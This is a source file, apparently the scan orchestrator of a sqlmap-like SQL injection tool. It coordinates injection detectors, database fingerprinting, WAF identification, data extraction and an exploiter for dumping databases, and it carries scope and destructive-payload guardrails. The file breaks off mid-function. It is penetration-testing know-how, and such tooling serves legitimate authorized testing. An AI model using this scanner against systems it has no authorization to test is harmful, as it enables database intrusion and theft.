import { nanoid } from 'nanoid';
import { TargetParser } from './TargetParser.js';
import { UnionDetector } from './detectors/UnionDetector.js';
import { ErrorDetector } from './detectors/ErrorDetector.js';
import { BooleanBlindDetector } from './detectors/BooleanBlindDetector.js';
import { TimeBlindDetector } from './detectors/TimeBlindDetector.js';
import { StackedDetector } from './detectors/StackedDetector.js';
import { OobDetector } from './detectors/OobDetector.js';
import { SecondOrderDetector } from './detectors/SecondOrderDetector.js';
import { NoSqlInjectionDetector } from './detectors/NoSqlInjectionDetector.js';
import { InlineQueryDetector } from './detectors/InlineQueryDetector.js';
import { DBFingerprinter } from './DBFingerprinter.js';
import { Extractor } from './Extractor.js';
import { Exploiter } from './Exploiter.js';
import { ColumnTypeEnumerator } from './ColumnTypeEnumerator.js';
import { WafIdentifier } from '../core/waf/WafIdentifier.js';
import { recommend } from '../core/waf/wafRecommend.js';
import { ReportGenerator } from '../services/ReportGenerator.js';
import { createTarget, createReport, createVulnerability } from './models.js';
// [P0-FIX 2026-09-09] 生产护栏：扫描级高危池策略通过 AsyncLocalStorage 下发给 selectPayloads
import { runWithDestructivePolicy, countDestructiveCandidates } from './payloadRegistry.js';
import { TECHNIQUE_TYPES, ERROR_SIG } from './payloads.js';
import { defaults } from '../config/defaults.js';
import * as eventBus from '../core/eventBus.js';
import { withSafeUrl } from '../core/safeUrlKeeper.js';
import { withCsrf } from '../core/csrfKeeper.js';
import { httpClient } from '../core/httpClient.js';
import { DirectConnector } from '../core/directConnector.js';
import { oobReceiver } from '../core/oobReceiver.js';
import { logger } from '../core/logger.js';
import { buildInjectionRequest, sendInjection, applyPrefixSuffix } from './injection.js';
// [P0-FIX 2026-09-09] 预筛/静态跳过/输入校验短路都是「探到异常才保留」的保守判定：
// 它们过去用 `res == null` 表示「探测没拿到结果 → 不跳」。sendInjection 现在把失败降级成
// 带 __netErr 的对象（不再是 null），若继续用 null 判断，两次失败的探测会被看成
// 「两侧同构 → 该点无信号 → 跳过完整检测」——那是直接新增假阴性。统一改用 isUnusableResponse。
import { isUnusableResponse } from './egressOpts.js';
// [P0-SEC 2026-09-08] 扫描级 scope 登记：放在 ScanManager 而不是只放在 REST 路由里——
// CLI（server/bin/cli.js）与测试/复用型调用不进路由，只放路由会造成「Web 有范围约束、
// CLI 没有」的双标（而 CLI 才是渗透现场的主入口）。
import { parseScope, registerScanScope, releaseScanScope } from '../core/scopeGuard.js';
import { runScanLoop } from './scanRunner.js';
import { extractAll, extractByScope } from './extractScope.js';

// [P2] 纯函数工具集已拆分到 scanHelpers.js，此处 re-export 保持向后兼容
export { urlHash, SYS_DBS, publicTarget, publicReport } from './scanHelpers.js';
import { mapPool, mergeExtracted, mergeExtractedForResume, hasData, publicTarget } from './scanHelpers.js';

// 扫描管理器（门面模式）：对外暴露 start/stop/getReport/exportReport，
// 内部串起「发现→指纹→四检测器→提取→构造报告」，全程经 EventBus 推送进度。
export class ScanManager {
  /**
   * @param {object} [opts]
   * @param {any} [opts.wafIdentifier] 测试注入：WAF 指纹识别器
   * @param {any} [opts.wafRecommend] 测试注入：tamper 推荐器
   * @param {number} [opts.retireTtlMs] 扫描上下文回收 TTL（默认 30s）
   * @param {number} [opts.maxScans] scans Map 上限（默认 100）
   */
  constructor({ wafIdentifier, wafRecommend, retireTtlMs, maxScans } = {}) {
    this.httpClient = httpClient; // 统一 HttpClient（便于测试时注入 mock）
    this.parser = new TargetParser(this.httpClient);
    // 扫描上下文回收（P0-R1）：completed/stopped/error 后置 retiredAt，TTL 到期清 scans 条目
    this.retireTtlMs = retireTtlMs ?? 30000; // 可测参数：测试可传短 TTL 验证回收
    this.maxScans = maxScans ?? 100; // scans Map 上限，超限淘汰最旧扫描
    this._scanClients = new Map(); // scanId -> 扫描作用域 HttpClient 视图（按 scanId 独立限速桶）
    // 检测器注册表：新增技术只加一个类并在此处登记（OobDetector 末位，作为盲注/无回显兜底）
    this.detectors = [
      new UnionDetector(),
      new ErrorDetector(),
      new BooleanBlindDetector(),
      new TimeBlindDetector(),
      new StackedDetector(),
      new OobDetector(),
    ];
    // 二阶注入检测器：独立实例，不进 this.detectors 数组（不参与一阶 per-point 循环，
    // 由 _runSecondOrder 在聚合之后作为补充趟调用，与一阶流水线正交）。
    this.secondOrderDetector = new SecondOrderDetector();
    // 非 SQL 注入检测器（NoSQL/GraphQL/SSTI）：同样独立实例，不进一阶循环，由 _runNoSql 补充趟调用（opt-in）。
    this.noSqlDetector = new NoSqlInjectionDetector();
    // 内联查询检测器（对标 sqlmap Q）：作为经典 SQLi 技术注册进一阶主调度（technique='inline'），
    // 仅当用户显式勾选 'inline' 时运行（opt-in），默认 techniques 不含它，避免对无回显点目标产生噪音。
    this.inlineDetector = new InlineQueryDetector();
    this.detectors.push(this.inlineDetector);
    this.fp = new DBFingerprinter();
    // WAF 指纹识别 + 推荐（可注入桩，默认使用真实实现；识别复用指纹基线，零额外发包）
    this.wafIdentifier = wafIdentifier || new WafIdentifier();
    this.wafRecommend = wafRecommend || recommend;
    this.extractor = new Extractor();
    this.exploiter = new Exploiter(this.extractor); // 利用能力（含堆叠深度提取 fallback）
    this.colTypeEnum = new ColumnTypeEnumerator();
    this.extractor.setColumnTypeEnumerator(this.colTypeEnum);
    this._colTypeCache = new Map(); // db.table -> 列类型数组，避免重复枚举相同表
    this.reportGen = new ReportGenerator();
    // scanId -> { target, report, status, cancelled }
    this.scans = new Map();
  }

  /**
   * 启动扫描（异步执行，立即返回 scanId）
   * @param {object} input 目标输入
   * @returns {Promise<string>} scanId
   */
  async start(input) {
    const target = createTarget(input);
    const scanId = nanoid(12);
    const report = createReport(scanId, target);
    // [P0-FIX 2026-09-09] 把「本次被抑制的能力」写进报告：抑制本身是对的，**不可见才是问题**。
    // 否则使用者只能靠猜「risk=3 到底投了没有」，而交付文档里一句「已按最高风险等级测试」
    // 就是错的——这类不实陈述在复盘里是要命的。
    try {
      report.summary = report.summary || {};
      report.summary.constraints = collectCapabilityConstraints(target.config);
    } catch { /* 约束标注失败不影响扫描 */ }
    // 授权范围登记（未配置 scope 时为 no-op，零行为变化）：HttpClient 在每一跳重定向前取用。
    try {
      registerScanScope(scanId, parseScope(target.config && target.config.scope));
    } catch { /* 登记失败不阻断扫描（入口侧已校过一次） */ }
    this.scans.set(scanId, { target, report, status: 'running', cancelled: false, createdAt: Date.now(), abortController: new AbortController() });
    eventBus.create(scanId);
    // [MERGED: security] 事件脱敏：SSE 不再携带 target 凭据（auth/cookie/header）
    eventBus.emit(scanId, 'scan_started', { scanId, target: publicTarget(target) });
    // scans Map 容量上限：超限淘汰最旧扫描（防本地 DoS 长跑内存膨胀）
    this._evictIfOverLimit();

    // 异步执行扫描流水线，避免阻塞 HTTP 响应
    this._run(scanId).catch((err) => {
      logger.error(`扫描 ${scanId} 异常：${err.message}`);
      eventBus.emit(scanId, 'scan_error', { code: err.code, message: err.message });
      const s = this.scans.get(scanId);
      if (s) {
        s.status = 'error';
        s.report.finishedAt = new Date().toISOString();
      }
      // 错误路径同样回收扫描上下文（30s TTL）
      this._retire(scanId);
    });

    return scanId;
  }

  // 停止扫描
  stop(scanId) {
    const s = this.scans.get(scanId);
    if (!s) return false;
    s.cancelled = true;
    s.paused = false; // 清除暂停态
    s.status = 'stopped';
    // [⑮] 中断在途 HTTP 请求：abort() 触发所有传入 signal 的 axios/undici 请求
    // 抛出 AbortError，不再等待超时或响应返回。与 s.cancelled 协作：
    //   abort → 中断当前在途请求（立即生效）
    //   cancelled → 阻止新请求发出（点边界轮询检查）
    try { s.abortController?.abort(); } catch { /* 已 abort 或不存在 */ }
    eventBus.emit(scanId, 'scan_stopped', { scanId });
    // stopped 路径回收扫描上下文
    this._retire(scanId);
    return true;
  }

  // [⑮] 获取扫描级 AbortSignal，供 httpClient wrapper 注入到每个请求
  getSignal(scanId) {
    return this.scans.get(scanId)?.abortController?.signal || null;
  }

  // [⑮] 包装 httpClient：自动将扫描级 signal 注入到每次 request 调用
  _wrapWithSignal(scanId, client) {
    const signal = this.getSignal(scanId);
    if (!signal || !client || typeof client.request !== 'function') return client;
    return { ...client, request: (opts) => client.request({ ...opts, signal }) };
  }

  // [P0-FIX] 暂停扫描：设置 paused 标志（扫描循环在点边界检查并等待），
  // 不回收上下文、不终止请求。仅 running 状态可暂停。
  pause(scanId) {
    const s = this.scans.get(scanId);
    if (!s || s.status !== 'running') return false;
    if (s.paused) return true; // 已暂停则幂等
    s.paused = true;
    s.status = 'paused';
    eventBus.emit(scanId, 'scan_paused', { scanId });
    return true;
  }

  // 恢复暂停的扫描：清除 paused 标志，回到 running。
  resume(scanId) {
    const s = this.scans.get(scanId);
    if (!s || s.status !== 'paused') return false;
    s.paused = false;
    s.status = 'running';
    eventBus.emit(scanId, 'scan_resumed', { scanId });
    return true;
  }

  // 获取实时报告（返回深拷贝，防 running 时序列化撕裂）
  getReport(scanId) {
    const s = this.scans.get(scanId);
    if (!s || !s.report) return null;
    try {
      return structuredClone(s.report);
    } catch {
      // structuredClone 不可用时回退 JSON 序列化
      return JSON.parse(JSON.stringify(s.report));
    }
  }

  // 导出报告（json / html / csv / markdown / db-json）
  exportReport(scanId, format = 'json') {
    const s = this.scans.get(scanId);
    if (!s) return null;
    if (format === 'html') return this.reportGen.toHTML(s.report);
    if (format === 'csv') return this.reportGen.toCSV(s.report);
    if (format === 'markdown' || format === 'md') return this.reportGen.toMarkdown(s.report);
    if (format === 'sarif') return this.reportGen.toSARIF(s.report); // [批次 9 2026-09-15] SARIF 2.1.0
    if (format === 'db-json') return JSON.stringify(s.report.data); // 仅拖库数据（库/表/列/行）
    return this.reportGen.toJSON(s.report);
  }

  // 选中技术集合：空/未定义 → 全部（含 stacked）；否则按所选
  // 若配置了 risk 级别，缩减高风险技术：
  //   risk 1：仅 union/error/boolean（安全，无写请求/无长时间等待）
  //   risk 2：全部（含 time/stacked/oob，默认）
  //   risk 3：全部 + 额外 OR 变体（由 Detector 层消费 risk 字段）
  _selectedTechs(config) {
    const sel = config && config.techniques;
    let techs = sel && sel.length ? sel : TECHNIQUE_TYPES;
    // [P0 2026-09-09] knownPoint.techniques：已知注入点的技术位白名单（扫描级过滤，
    // 与 config.techniques 取交集）——手工确认 union 注入后不再全技术位扫
    const kpTechs = config && config.knownPoint && Array.isArray(config.knownPoint.techniques)
      ? config.knownPoint.techniques
      : null;
    if (kpTechs && kpTechs.length) techs = techs.filter((t) => kpTechs.includes(t));
    // risk 门控
    const risk = (config && config.risk) != null ? config.risk : 2;
    if (risk < 2) {
      // risk 1：排除 time（慢速等待）、stacked（写操作风险）、oob（出站请求）
      techs = techs.filter((t) => !['time', 'stacked', 'oob'].includes(t));
    }
    // risk 3 不需要额外过滤，因为 risk 3 的 OR 变体由 Detector 独立消费 risk 字段
    return techs;
  }

  // 按技术选择过滤检测器（唯一过滤入口）
  activeDetectors(config) {
    const sel = this._selectedTechs(config);
    return this.detectors.filter((d) => sel.includes(d.technique));
  }

  // 连接器选择：direct 目标用 DirectConnector 直连数据库，其余用统一 HttpClient 单例。
  getConnector(target) {
    return target && target.mode === 'direct' ? new DirectConnector(target) : this.httpClient;
  }

  // 关闭非单例的连接器（如直连 DirectConnector），避免连接泄漏；HttpClient 单例不关。
  async _maybeClose(connector) {
    if (connector && connector !== this.httpClient && connector.close) {
      try {
        await connector.close();
      } catch {
        /* ignore */
      }
    }
  }

  // 获取扫描作用域的 HttpClient 视图：http 目标包装为按 scanId 独立限速桶的客户端
  // （前端 ratePerSec 设置由此生效，Detector/Extractor 无需改动），direct 目标原样返回。
  getScanClient(scanId, target) {
    const connector = this.getConnector(target);
    if (connector !== this.httpClient || typeof connector.forScan !== 'function') return connector;
    if (!this._scanClients.has(scanId)) {
      // [sqlmap 对标] --reqrate：reqRate > 0 时覆盖 ratePerSec 作为 TokenBucket 速率
      const reqRate = target.config && target.config.reqRate;
      const ratePerSec = (reqRate && reqRate > 0 ? reqRate : (target.config && target.config.ratePerSec)) || undefined;
      const sc = connector.forScan(scanId, ratePerSec);
      // [sqlmap 对标] --safe-url/--safe-freq：配置了保活 URL 时包装客户端
      // （SSRF 校验在 client.request 内逐请求执行；失败静默不影响扫描）
      const cfg = (target && target.config) || {};
      let view = sc;
      if (typeof cfg.safeUrl === 'string' && /^https?:\/\//i.test(cfg.safeUrl)) {
        view = /** @type {any} */ (withSafeUrl(sc, { safeUrl: cfg.safeUrl, safeFreq: cfg.safeFreq }));
      }
      // [sqlmap 对标 2026-09-14] --csrf-url/--csrf-token：CSRF 会话层（取页提取 token，
      // 每请求自动携带 + 定期刷新）。挂在 safeUrl 之后：token 取页吃到保活/协议策略。
      if (typeof cfg.csrfUrl === 'string' && /^https?:\/\//i.test(cfg.csrfUrl)) {
        view = /** @type {any} */ (withCsrf(view, {
          csrfUrl: cfg.csrfUrl,
          csrfTokenName: cfg.csrfTokenName,
          csrfMethod: cfg.csrfMethod,
          refreshFreq: cfg.csrfRefreshFreq,
        }));
      }
      // [P2-5] --force-ssl / --ignore-redirects：协议层策略注入每个请求（对标 sqlmap）。
      // forceSsl：目标 http:// 强制升级 https（httpClient.request 消费改写）；
      // ignoreRedirects：不跟随 3xx（httpClient.request 消费跳转上限 0）。
      // 在 forScan 视图之上再包一层，Detector/Extractor/二阶/NoSQL/WAF 全路径统一生效，
      // 且不影响未配协议策略的存量扫描（无配置时 view 原样返回零开销）。
      // [P1-FIX 2026-09-08 接线补齐] 出口层三键走同一个注入点：
      //   insecureTls / trustProxyEnv / ssrfViaProxy 此前只能靠 defaults 或环境变量——
      //   Detector.send 等 7 个调用点只透传 `proxy/auth`，per-scan config 到不了 HttpClient，
      //   于是「UI 勾了忽略自签证书」对实际发包无效（引擎已实现能力在 API 层不可达）。
      //   在扫描级视图统一注入后，新增出口类配置只需改 defaults + 白名单 + 这一处，不再漏接线。
      const egressPatch = {};
      if (cfg.insecureTls === true) egressPatch.insecureTls = true;
      if (cfg.trustProxyEnv !== undefined) egressPatch.trustProxyEnv = cfg.trustProxyEnv !== false;
      if (cfg.ssrfViaProxy !== undefined) egressPatch.ssrfViaProxy = cfg.ssrfViaProxy;
      const proto =
        cfg.forceSsl === true || cfg.ignoreRedirects === true || Object.keys(egressPatch).length > 0
          ? egressPatch
          : null;
      const baseHead = typeof view.headRequest === 'function' ? view.headRequest.bind(view) : null;
      if (proto) {
        const baseRequest = view.request.bind(view);
        view = {
          ...view,
          request: (opts) => baseRequest({
            ...opts,
            ...(cfg.forceSsl === true ? { forceSsl: true } : {}),
            ...(cfg.ignoreRedirects === true ? { ignoreRedirects: true } : {}),
            ...egressPatch,
          }),
          // [P0-FIX 2026-09-09] headRequest（--null-connection）必须走同一层包装：
          // 它不经过 view.request，以前只包 request 等于「HEAD 一路看不到 insecureTls/代理/scope 以外的出口语义」。
          // 实战表现：自签目标上 GET 能扫、开了 --null-connection 就全量失败，现场极难归因。
          ...(baseHead
            ? {
                headRequest: (url, opts = {}) =>
                  baseHead(url, {
                    ...opts,
                    ...(cfg.forceSsl === true ? { forceSsl: true } : {}),
                    ...(cfg.ignoreRedirects === true ? { ignoreRedirects: true } : {}),
                    ...egressPatch,
                  }),
              }
            : {}),
        };
      }
      this._scanClients.set(scanId, view);
    }
    return this._scanClients.get(scanId);
  }

  // 指纹结果按目标缓存（同目标多注入点不重复跑 8-9 请求指纹）。
  // fpCache 存 Promise：并发 worker 同时命中 miss 时共享同一 in-flight 指纹，杜绝重复请求。
  async _fingerprintCached(fpCache, ctxBase, target, point) {
    const key = target.baseUrl || target.url || (target.mode === 'direct' ? 'direct' : 'target');
    let entry = fpCache.get(key);
    if (!entry) {
      entry = this.fp
        .fingerprint({ ...ctxBase, target, point })
        .catch((e) => {
          logger.warn(`指纹识别失败：${e.message}`);
          return null;
        });
      fpCache.set(key, entry);
    }
    return await entry;
  }

  // 扫描上下文回收：completed/stopped/error 后置 retiredAt，TTL 到期清 scans 条目 + eventBus + 限速桶
  _retire(scanId) {
    const s = this.scans.get(scanId);
    if (!s || s._retired) return;
    s._retired = true;
    s.retiredAt = new Date().toISOString();
    const timer = setTimeout(() => {
      this._disposeScan(scanId);
    }, this.retireTtlMs);
    if (typeof timer.unref === 'function') timer.unref(); // 不阻塞进程退出
    s._retireTimer = timer;
  }

  // 立即清理某次扫描的全部上下文（TTL 到期 / 超限淘汰）
  _disposeScan(scanId) {
    // [P0-SEC] 同步回收 scope 登记（防同 id 复用旧范围，也防 Map 无界增长）
    releaseScanScope(scanId);
    const rec = this.scans.get(scanId);
    this.scans.delete(scanId);
    eventBus.dispose(scanId);
    if (this._scanClients.has(scanId)) {
      if (typeof this.httpClient.removeBucket === 'function') this.httpClient.removeBucket(scanId);
      // [sqlmap 对标] --max-requests：清理请求计数（防 Map 无界增长）
      if (typeof this.httpClient.removeRequestCount === 'function') this.httpClient.removeRequestCount(scanId);
      // [P1-FIX 2026-09-05] Cookie Jar 随扫描退役清理（防跨扫描会话泄漏 + Map 无界增长）
      if (typeof this.httpClient.clearJar === 'function') this.httpClient.clearJar(scanId);
      this._scanClients.delete(scanId);
    }
    if (rec && rec._retireTimer) clearTimeout(rec._retireTimer);
  }

  // scans Map 容量上限：超限淘汰最旧扫描
  // [MERGED: engine ★FIX-2] 只淘汰「非 running」的扫描：运行中的扫描若被淘汰，报告会立即
  // 从 getReport 中消失（用户拿不到结果），而 _run 的请求仍在继续（脱离治理）。
  // 全部 running 时宁可暂时超限也不淘汰在途扫描。
  _evictIfOverLimit() {
    if (this.scans.size <= this.maxScans) return;
    let victim = null;
    let oldestTs = Infinity;
    for (const [id, rec] of this.scans) {
      if (rec.status === 'running') continue; // 不淘汰运行中的扫描
      const ts = rec.createdAt || 0;
      if (ts < oldestTs) {
        oldestTs = ts;
        victim = id;
      }
    }
    if (victim) this._disposeScan(victim);
  }
  // 扫描流水线
  async _run(scanId) {
    // [P0-FIX 2026-09-09] 把生产护栏策略放进本次扫描的异步上下文：所有经 selectPayloads 的筛选
    // 自动读到，不需要每个检测器手工透传（又一个「某个阶段漏一个键」的坑位就此消失）。
    const s = this.scans.get(scanId);
    const cfg = (s && s.target && s.target.config) || {};
    return runWithDestructivePolicy(
      {
        productionMode: cfg.productionMode !== false,
        confirmDestructive: cfg.confirmDestructive === true,
      },
      () => runScanLoop(this, scanId)
    );
  }
  // [B-perf] skip-static 参数预筛选（对标 sqlmap --skip-static，opt-in）：
  // 返回「需完整检测」的点集合；被判静态（同值重复 / 哨兵探测无差异）的点被过滤。
  // 两层判定（均保守，宁可多测不漏检）：
  //   a) 同值去重：原始值完全相同的参数只测第一个（零请求成本；检测结论对同值参数等价）。
  //   b) 哨兵探测：仅剩单点时跳过（无跨点预算可省）；多点时对每点发 1 次哨兵请求
  //      （值改为明显不同的哨兵值），与「原始值基线」比对——状态码、正文长度、规范化正文
  //      全部一致且哨兵值未回显在响应中 → 判定静态参数；任一维度有差异 / 任一请求失败
  //      → 保守保留做完整检测。
  // 基线按「请求方法 + URL」缓存共享：同页面的多参数目标只发 1 次基线（form 点不同 action
  // 各自基线），总成本 ≈ 去重后点数 + 1 请求。不修改注入点对象、不改变报告 point 列表。
  // 精确标记点（precisionMarked，用户显式 * 指定）不参与任何跳过。
  async _skipStaticPoints(ctxBase, target, points) {
    if (target.mode === 'direct' || !points || points.length === 0) return points || [];
    const httpClient = ctxBase.httpClient;
    const ctx = { ...ctxBase, target };
    const skip = [];
    // a) 同值去重（零请求）：原始值完全相同的参数只测第一个
    const seenValues = new Set();
    const toProbe = [];
    for (const p of points) {
      if (p && p.precisionMarked) {
        toProbe.push(p); // 用户显式指定的点：不做同值去重，也不做哨兵跳过
        continue;
      }
      const val = p.originalValue == null ? '' : String(p.originalValue);
      if (seenValues.has(val)) {
        skip.push(p);
        continue;
      }
      seenValues.add(val);
      toProbe.push(p);
    }
    if (toProbe.length <= 1) return points.filter((p) => !skip.includes(p));
    // b) 哨兵探测：每点 1 请求（基线跨点共享）；点级并发限 4，与预筛选对齐
    const baselineCache = new Map(); // `${method} ${url}` -> Promise<响应|null>
    const getBaseline = (point) => {
      const orig = point.originalValue == null ? '' : String(point.originalValue);
      const req = buildInjectionRequest(target, point, orig);
      const key = `${req.method || 'GET'} ${req.url}`;
      if (!baselineCache.has(key)) {
        baselineCache.set(key, sendInjection(httpClient, ctx, req, { retry: 0 }).catch(() => null));
      }
      return baselineCache.get(key);
    };
    await this._mapPool(
      toProbe,
      async (point) => {
        try {
          if (point.precisionMarked) return; // 精确标记点永不跳过
          const orig = point.originalValue == null ? '' : String(point.originalValue);
          const sentinel = this._staticSentinel(orig);
          const sentReq = buildInjectionRequest(target, point, sentinel);
          // 哨兵探测用零重试（失败即保守保留，不放大探测成本）
          const [baseRes, sentRes] = await Promise.all([
            getBaseline(point),
            sendInjection(httpClient, ctx, sentReq, { retry: 0 }),
          ]);
          if (!baseRes || !sentRes || isUnusableResponse(baseRes) || isUnusableResponse(sentRes)) return; // 基线/哨兵任一失败 → 无法判定 → 保守保留
          // ① 状态码必须一致
          if ((baseRes.status ?? null) !== (sentRes.status ?? null)) return;
          const baseBody = String(baseRes.data ?? '');
          const sentBody = String(sentRes.data ?? '');
          // ② 正文长度必须一致（字节级，不做容差——判定要保守）
          if (baseBody.length !== sentBody.length) return;
          // ③ 规范化正文必须完全一致（仅折叠空白，动态内容敏感）
          if (this._normalizeForStatic(baseBody) !== this._normalizeForStatic(sentBody)) return;
          // ④ 哨兵值不得回显在响应中（回显 = 参数参与响应构造 → 动态参数）
          const injectedSentinel = applyPrefixSuffix(target, point, sentinel);
          if (sentBody.includes(injectedSentinel)) return;
          // 四项全过 → 静态参数（改值不影响响应），跳过完整检测
          skip.push(point);
        } catch {
          /* 构造/发送异常 → 保守保留 */
        }
      },
      4
    );
    return points.filter((p) => !skip.includes(p));
  }

  // 哨兵值构造：数字 +1001（1→1002）、非数字字符串加 _sst 后缀（abc→abc_sst）
  _staticSentinel(orig) {
    if (/^-?\d+(\.\d+)?$/.test(orig)) {
      const n = Number(orig);
      if (Number.isFinite(n)) return String(n + 1001);
    }
    return `${orig}_sst`;
  }

  // 静态判定用正文规范化：仅折叠连续空白并去首尾（时间戳/CSRF 等任何其它差异都视为动态）
  _normalizeForStatic(body) {
    return String(body ?? '')
      .replace(/\s+/g, ' ')
      .trim();
  }

  // P2-P1 参数预筛选：对每个注入点发 3 个廉价探测（基线 + 单引号报错 + 时间向量，点内并行），
  // 返回「需完整检测」的点；明显无注入迹象的点被过滤（省完整检测的指纹/检测器请求，约 50-75%）。
  // 保守策略（宁可多测不漏检）：
  //   · 任一探测请求失败 / 在预算时间内未返回（网络/超时/慢目标）→ 无法判定 → 保守保留；
  //   · 单引号探测响应明显偏离基线（状态码/长度/前缀变化）→ 可疑 → 保留；
  //   · 时间向量探测耗时明显高于绝对下限 → 触发延迟 → 保留；
  //   · 仅当两探皆无信号才判「无注入迹象」→ 跳过完整检测。
  // 探测带预算竞速（_prefilterBudgetMs）：目标不可达/DNS 慢时探测不阻塞流水线，超时按保守保留处理。
  // 预筛选不修改注入点对象、不改变报告 point 列表，仅影响「哪些点进入完整检测循环」。
  async _prefilterPoints(ctxBase, target, points) {
    const cfg = ctxBase.config || {};
    if (target.mode === 'direct' || !points || points.length === 0) return points || [];
    const httpClient = ctxBase.httpClient;
    // [P0 2026-09-09] knownPoint 直通点不参与预筛选（手工确认的可注入点不需要
    // 「有没有迹象」判定；探针反而可能因闭合形态未给全而误判无信号），
    // 但必须原样并入返回集（调用方以返回集作为「进入完整检测」的点集合）
    const knownPoints = points.filter((p) => p.knownPoint);
    points = points.filter((p) => !p.knownPoint);
    if (points.length === 0) return knownPoints;
    const skipIds = new Set();
    const prefilterCtx = { ...ctxBase, target };
    const sleepSec = cfg.timeBlindSleepSec ?? defaults.timeBlindSleepSec ?? 2;
    // [P1-FIX 2026-09-05] 动态预算：原固定 120ms 在公网（RTT>120ms）下探测必超时 → 全部保守
    // 保留 → 预筛选空转。改为：目标基线 RTT 实测（共享 1 次）→ 预算 = clamp(3×RTT+150, 300, 2000)。
    // 基线测不通（不可达）→ 直接跳过预筛（保守保留全部，与旧超时行为一致但零白费请求）。
    // 手动 cfg.prefilterBudgetMs 仍最高优先（不测基线，保持确定性）。
    let budgetMs = Number.isFinite(cfg.prefilterBudgetMs) && cfg.prefilterBudgetMs > 0
      ? cfg.prefilterBudgetMs
      : null;
    if (budgetMs == null) {
      const rtt = await this._probeBaselineRttMs(httpClient, prefilterCtx, target, points[0]);
      if (rtt == null) {
        logger.info('预筛选基线测量失败（目标不可达/超时），跳过预筛选，保守保留全部注入点');
        return [...knownPoints, ...points];
      }
      budgetMs = Math.min(2000, Math.max(300, Math.round(rtt * 3 + 150)));
    }
    // 时间向量信号下限：绝对秒级延迟余量（≈0.5-0.9s），宽于检测阈值，保守兜住真实 sleep
    const timeFloorMs = Math.max(800, (cfg.timeThresholdMs ?? defaults.timeThresholdMs) * 0.6);
    // [P1-FIX 2026-09-05] 时间探针按 dbms 选族（原硬编码 MySQL SLEEP：非 MySQL 目标必然
    // 语法错误无延时信号 → 预筛漏剪时间型注入点）。未知库发 MySQL+PG 双族覆盖最常见两系。
    const dbms = cfg.dbms || target?.config?.dbms || target.dbms || ctxBase.dbms || null;
    const timeProbeValues = this._timeProbeValues(dbms, sleepSec);
    // [MERGED: perf] 请求治理：旧实现 Promise.all(points.map(...)) 对全部点 × 3 探测并发（无上限）；
    // 且探测经令牌桶排队，预算内放不完时 Promise.race 返回 null → 保守全保留，
    // 但已排队的探测请求仍会发出（结果被丢弃）→ 白费 3×N 请求。本版：
    //   1) 仅当全部探测（N×(2+时间探针数)）可在「初始满桶突发 + 预算窗口」内放行时才预筛（限速过低直接跳过，零白费请求）；
    //   2) 点级并发经 _mapPool 限到 4，避免无上限并发放大突发。
    const ratePerSec = Number.isFinite(cfg.ratePerSec) && cfg.ratePerSec > 0 ? cfg.ratePerSec : defaults.ratePerSec;
    const totalProbes = points.length * (2 + timeProbeValues.length);
    const servableInBudget = ratePerSec + (budgetMs / 1000) * ratePerSec;
    if (totalProbes > servableInBudget) {
      logger.info(
        `预筛选预算不足（${points.length} 点 × 3 探测 = ${totalProbes} 请求 > 限速 ${ratePerSec}/s × ~${(budgetMs / 1000).toFixed(2)}s 可放行 ${Math.floor(servableInBudget)}），跳过预筛选避免白费请求`
      );
      return [...knownPoints, ...points];
    }
    // 点级并发限 4（12 个并发探测）：与调度并发对齐，避免 points×3 无上限并发
    await this._mapPool(
      points,
      async (point) => {
        const orig = point.originalValue || '1';
        const probe = (value) => {
          const req = buildInjectionRequest(target, point, value);
          const t0 = Date.now();
          // 预筛选探测用短超时 + 零重试：慢/不可达目标（DNS 慢、页面慢）快速放弃并保守保留。
          // 短超时会取消底层请求（含 DNS 解析），不残留后台请求占住事件循环（测试/慢目标友好）。
          return sendInjection(httpClient, prefilterCtx, req, { timeoutMs: budgetMs, retry: 0 }).then(
            (res) => ({ res, elapsed: Date.now() - t0 })
          );
        };
        try {
          // 基线 + 单引号报错 + 时间向量（按 dbms 选族）并行，整体受预算竞速约束：墙钟≈单次 RTT
          const probes = [probe(orig), probe(`${orig}'`), ...timeProbeValues.map((v) => probe(`${orig}${v}`))];
          const trio = await Promise.race([
            Promise.all(probes),
            new Promise((resolve) => setTimeout(() => resolve(null), budgetMs)),
          ]);
          if (!trio) return; // 预算超时：无法判定 → 保守保留
          const [base, quote, ...timed] = trio;
          // 保守：任一探测失败（网络错误/超时）→ 保留做完整检测，绝不因探测失败漏检
          if (!base || base.res == null || isUnusableResponse(base.res) || !quote || quote.res == null || isUnusableResponse(quote.res)) return;
          if (timed.some((t) => !t || t.res == null || isUnusableResponse(t.res))) return;
          // 探测① 单引号报错：闭合破坏 → 报错/空页/500 → 响应明显偏离基线 → 可疑保留
          const baseBody = String(base.res?.data ?? '');
          const baseStatus = base.res?.status ?? null;
          const quoteBody = String(quote.res?.data ?? '');
          const quoteStatus = quote.res?.status ?? null;
          if (!this._prefilterSimilar(baseBody, baseStatus, quoteBody, quoteStatus)) {
            // [OPT-FIX 2026-09-08] 输入校验甄别（fp_strict 类 205 请求削减）：单引号探针报错后，
            // 追加 1 个「良性非法值」探针（zz9qx0，无任何 SQL 特征）：
            //   · 良性探针响应与单引号探针同构（状态码+正文指纹一致）→ 是输入白名单/校验报错
            //     而非 SQL 报错 → 该点注入面无效 → 安全跳过（实测 205 请求 → ~7 请求）；
            //   · 任一差异 → 真实 SQL 报错信号 → 保守保留完整检测（不漏检）；
            //   · 良性探针失败/超时 → 保守保留。
            // [OPT-FIX 2026-09-08] 输入校验甄别（fp_strict 类 205 请求削减）：单引号探针报错后，
            // 追加 1 个「良性非法值」探针（zz9qx0，无任何 SQL 特征）：
            //   · 良性探针响应与单引号探针同构（状态码+正文指纹一致）→ 是输入白名单/校验报错
            //     而非 SQL 报错 → 该点注入面无效 → 安全跳过（实测 205 请求 → ~6 请求）；
            //   · 任一差异 → 真实 SQL 报错信号 → 保守保留完整检测（不漏检）；
            //   · 良性探针失败/超时 → 保守保留。
            // [OPT-FIX 2026-09-08#2] 甄别仅适用于「报错状态码」响应（status>=400）：无报错状态
            // 的空结果页（200 "No results found"）在真注入点（布尔差异型，如 sqli-labs L04）上
            // 与良性非法值天然同构——若不限定状态码会把布尔差异型注入点误跳过（实测漏检）。
            // 200 空结果页不受影响（走正常信号判定保留完整检测），仅牺牲 200 自定义错误页
            // 目标的削减收益（保守换取零漏检）。
            if (quoteStatus != null && quoteStatus >= 400) {
              try {
                const benign = await probe(`${orig}zz9qx0`);
                if (benign && benign.res != null) {
                  const bBody = String(benign.res?.data ?? '');
                  const bStatus = benign.res?.status ?? null;
